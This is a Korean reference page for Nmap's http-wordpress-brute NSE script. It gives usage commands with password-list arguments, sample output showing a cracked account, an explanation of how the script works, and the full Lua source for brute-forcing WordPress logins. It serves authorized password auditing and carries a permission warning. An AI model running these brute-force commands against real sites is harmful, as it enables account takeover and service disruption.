# 쉘 스크립트 작성 실습 예제

## 작업 식별

| 항목 | 내용 |
|---|---|
| Task ID | LNX-SCR-005-REF |
| 유형 | REF (스크립트 사양·사용 예) |
| 목적 | Nmap NSE 스크립트 `http-wordpress-brute`의 인자, 출력, 동작 방식을 참조한다 |
| 확인 상태 | 미검증 (원본 페이지와 스크립트 코드를 읽고 정리한 것이며 이 환경에서 실행하지 않았다) |
| 개정 | R1 (2026-11-18) |

{% hint style="info" %}
NOTE: 이 페이지의 내용은 쉘 스크립트가 아니라 Nmap이 쓰는 Lua 기반 NSE(Nmap Scripting Engine) 스크립트다. 쉘 스크립트 실습은 [LNX-SCR-003-MP](shell-script-practice.md)와 [LNX-SCR-004-MP](shell-script-logclean.md)를 따른다. 원본 페이지 제목과 SUMMARY 항목은 바꾸지 않았다.
{% endhint %}

{% hint style="danger" %}
WARNING: 이 스크립트는 로그인 폼에 비밀번호를 반복해 대입한다(분류: `intrusive`, `brute`). 소유자가 서면으로 허가한 시스템에만 사용한다. 무허가 사용은 불법이며, 대상의 계정 잠금과 서비스 부하를 일으킬 수 있다.
{% endhint %}

## 1. 개요

WordPress 설치 대상에 대해 무작위 대입(brute force) 방식으로 비밀번호를 점검한다. `unpwdb`와 `brute` 라이브러리로 추측을 수행하고, 성공한 계정은 `creds` 라이브러리에 저장한다. 같은 계열의 스크립트로 `http-form-brute.nse`가 있다.

| 항목 | 내용 |
|---|---|
| 포트 규칙 | HTTP 서비스(`shortport.http`)를 대상으로 한다 |
| 분류 | `intrusive`, `brute` |
| 기본 URI | `/wp-login.php` |
| 사용자 이름 폼 변수 | `log` |
| 비밀번호 폼 변수 | `pwd` |
| 라이선스 | Nmap 라이선스를 따른다(<https://nmap.org/book/man-legal.html>) |

## 2. 사용 방법

```
nmap -sV --script http-wordpress-brute <대상>
nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=<도메인>,http-wordpress-brute.threads=3,brute.firstonly=true' <대상>
```

`<대상>`은 호스트 이름 또는 IP 주소다. 원본 예시에는 `<대상>`이 빠져 있어 보충했다.

### 스크립트 인자

| 인자 | 뜻 | 기본값 |
|---|---|---|
| `http-wordpress-brute.uri` | `wp-login.php` 경로 | `/wp-login.php` |
| `http-wordpress-brute.hostname` | 가상 호스팅일 때 Host 헤더 값 | 없음 |
| `http-wordpress-brute.uservar` | 사용자 이름을 담는 HTTP 변수 이름 | `log` |
| `http-wordpress-brute.passvar` | 비밀번호를 담는 HTTP 변수 이름 | `pwd` |
| `http-wordpress-brute.threads` | 스레드 수 | `3` |

### 함께 쓰는 인자

| 인자 | 뜻 |
|---|---|
| `http.useragent` | HTTP 요청의 User-Agent 문자열 |
| `brute.firstonly` | `true`이면 첫 성공 자격 증명을 찾을 때 중단한다 |
| `brute.mode` | `user`, `creds`, `pass` 중 사용자·비밀번호 순회 방식 |
| `passdb` | 비밀번호 목록 파일 경로 |
| `userdb` | 사용자 목록 파일 경로 |

## 3. 출력 예

```
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
| http-wordpress-brute:
|   Accounts
|     0xdeadb33f:god => Login correct
|   Statistics
|_    Perfomed 103 guesses in 17 seconds, average tps: 6
```

`Perfomed`는 스크립트 원문의 철자다.

## 4. 동작 방식 (코드 기준)

| 단계 | 함수 | 동작 |
|---|---|---|
| 사전 점검 | `check` | `GET <uri>`의 응답이 200이고 본문에 `type='password'` 입력란이 있으면 공격을 시작한다. 아니면 중단한다 |
| 로그인 시도 | `login` | `POST <uri>`에 `<uservar>=<사용자>`, `<passvar>=<비밀번호>`를 보낸다. 응답 상태가 302(`/wp-admin`으로 리디렉션)이면 성공으로 판정한다 |
| 실행 | `action` | 인자를 읽고 `brute.Engine`을 만들어 스레드 수를 정한 뒤 시작한다 |

{% hint style="info" %}
NOTE: 응답이 302이면 성공으로 보는 방식이라, 다른 이유로 302를 돌려주는 사이트(예: 로그인 페이지로 되돌리는 보안 플러그인)에서는 오탐이 날 수 있다. 이 설명은 코드를 읽고 추론한 것이며 미검증이다.
{% endhint %}

## 5. 전체 스크립트

원본 코드를 그대로 보존했다.

{% code title="http-wordpress-brute.nse" %}
```lua
local brute = require "brute"
local creds = require "creds"
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"

description = [[
performs brute force password auditing against Wordpress CMS/blog installations.

This script uses the unpwdb and brute libraries to perform password guessing. Any successful guesses are
stored using the credentials library.

Wordpress default uri and form names:
* Default uri:<code>wp-login.php</code>
* Default uservar: <code>log</code>
* Default passvar: <code>pwd</code>
]]

---
-- @usage
-- nmap -sV --script http-wordpress-brute <target>
-- nmap -sV --script http-wordpress-brute
--   --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,
--                  http-wordpress-brute.threads=3,brute.firstonly=true' <target>
--
-- @output
-- PORT     STATE SERVICE REASON
-- 80/tcp   open  http    syn-ack
-- | http-wordpress-brute:
-- |   Accounts
-- |     0xdeadb33f:god => Login correct
-- |   Statistics
-- |_    Perfomed 103 guesses in 17 seconds, average tps: 6
--
-- @args http-wordpress-brute.uri points to the file 'wp-login.php'. Default /wp-login.php
-- @args http-wordpress-brute.hostname sets the host header in case of virtual
--       hosting
-- @args http-wordpress-brute.uservar sets the http-variable name that holds the
--                                    username used to authenticate. Default: log
-- @args http-wordpress-brute.passvar sets the http-variable name that holds the
--                                    password used to authenticate. Default: pwd
-- @args http-wordpress-brute.threads sets the number of threads. Default: 3
--
-- Other useful arguments when using this script are:
-- * http.useragent = String - User Agent used in HTTP requests
-- * brute.firstonly = Boolean - Stop attack when the first credentials are found
-- * brute.mode = user/creds/pass - Username password iterator
-- * passdb = String - Path to password list
-- * userdb = String - Path to user list
--
-- @see http-form-brute.nse

author = "Paulino Calderon <이메일 생략>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "brute"}

portrule = shortport.http

local DEFAULT_WP_URI = "/wp-login.php"
local DEFAULT_WP_USERVAR = "log"
local DEFAULT_WP_PASSVAR = "pwd"
local DEFAULT_THREAD_NUM = 3

---
--This class implements the Driver class from the Brute library
---
Driver = {
  new = function(self, host, port, options)
    local o = {}
    setmetatable(o, self)
    self.__index = self
    o.hostname = stdnse.get_script_args('http-wordpress-brute.hostname')
    o.http_options = {
      no_cache = true,
      header = {
        -- nil just means not set, so default http.lua behavior
        Host = stdnse.get_script_args('http-wordpress-brute.hostname')
      }
    }
    o.host = host
    o.port = port
    o.uri = stdnse.get_script_args('http-wordpress-brute.uri') or DEFAULT_WP_URI
    o.options = options
    return o
  end,

  connect = function( self )
    -- This will cause problems, as there is no way for us to "reserve"
    -- a socket. We may end up here early with a set of credentials
    -- which won't be guessed until the end, due to socket exhaustion.
    return true
  end,

  login = function( self, username, password )
    stdnse.debug2("HTTP POST %s%s", self.http_options.header.Host or stdnse.get_hostname(self.host), self.uri)
    local response = http.post( self.host, self.port, self.uri, self.http_options,
      nil, { [self.options.uservar] = username, [self.options.passvar] = password } )
    -- This redirect is taking us to /wp-admin
    if response.status == 302 then
      return true, creds.Account:new( username, password, creds.State.VALID)
    end

    return false, brute.Error:new( "Incorrect password" )
  end,

  disconnect = function( self )
    return true
  end,

  check = function( self )
    local response = http.get( self.host, self.port, self.uri, self.http_options )
    stdnse.debug1("HTTP GET %s%s", self.http_options.header.Host or stdnse.get_hostname(self.host), self.uri)
    -- Check if password field is there
    if ( response.status == 200 and response.body:match('type=[\'"]password[\'"]')) then
      stdnse.debug1("Initial check passed. Launching brute force attack")
      return true
    else
      stdnse.debug1("Initial check failed. Password field wasn't found")
    end

    return false
  end

}
---
--MAIN
---
action = function( host, port )
  local status, result, engine
  local uservar = stdnse.get_script_args('http-wordpress-brute.uservar') or DEFAULT_WP_USERVAR
  local passvar = stdnse.get_script_args('http-wordpress-brute.passvar') or DEFAULT_WP_PASSVAR
  local thread_num = tonumber(stdnse.get_script_args("http-wordpress-brute.threads")) or DEFAULT_THREAD_NUM

  engine = brute.Engine:new( Driver, host, port, { uservar = uservar, passvar = passvar } )
  engine:setMaxThreads(thread_num)
  engine.options.script_name = SCRIPT_NAME
  status, result = engine:start()

  return result
end
```
{% endcode %}

## 6. 참조

| 참조 문서 | Task ID | 제목 |
|---|---|---|
| [shell-script-practice.md](shell-script-practice.md) | LNX-SCR-003-MP | 쉘 스크립트 작성과 실행 |
| [Nmap NSE 문서(외부)](https://nmap.org/nsedoc/scripts/http-wordpress-brute.html) | | 스크립트 공식 문서 |

## 7. 개정 이력

| 개정 | 날짜 | 변경 내용 |
|---|---|---|
| R1 | 2026-11-18 | 원본(Nmap 스크립트 설명을 번역·복사한 페이지)을 REF 형식으로 재작성. 허가 범위 경고, 인자 표, 동작 방식 표를 추가하고 저자 연락처와 한국어 요약 절을 정리했다 |
